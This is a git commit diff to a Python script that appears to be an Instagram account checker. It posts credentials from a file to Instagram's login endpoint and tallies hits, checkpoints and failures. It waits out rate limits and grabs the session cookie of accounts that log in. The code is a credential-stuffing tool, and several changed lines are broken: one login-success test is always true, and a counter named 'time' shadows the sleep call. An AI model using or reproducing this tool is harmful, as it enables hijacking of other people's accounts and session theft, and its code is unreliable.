1f81efd0b9bf33e5a1cc654baeff78af0557d9d0
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-24 12:53:52 +0300

    Update .dabll.py

--- .dabll.py
+++ .dabll.py
@@ -87,7 +87,7 @@ for line in file:
     'x-requested-with': 'XMLHttpRequest'}
     data_login = {
     'username': username_login,
-    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password_login}',
+    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password_login}',
     'queryParams': '{}',
     'optIntoOneTap': 'false'}
     req_login = requests.post(url_login, data=data_login, headers=headers_login)
@@ -99,15 +99,15 @@ for line in file:
     elif '"message":"Please wait a few minutes before you try again."' in req_login.text:
         os.system("clear")
         print(logo2)
-        checkpoint+=1
-        print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-    elif '"message":"Please wait a few minutes before you try again."' in req_login.text:
-        os.system("clear")
-        print(logo2)
         time+=1
         print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+    elif ('"message":"checkpoint_required"') in req_login.text:
+        os.system("clear")
+        print(logo2)
+        checkpoint+=1
+        print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
         time.sleep(360)
-    elif '"authenticated":true' in req_login.text:
+    elif '"authenticated":true' or 'userId' in req_login.text:
         sessd = req_login.cookies['sessionid']
         for file in range(1):
             url_checker = 'https://www.instagram.com/accounts/login/ajax/'
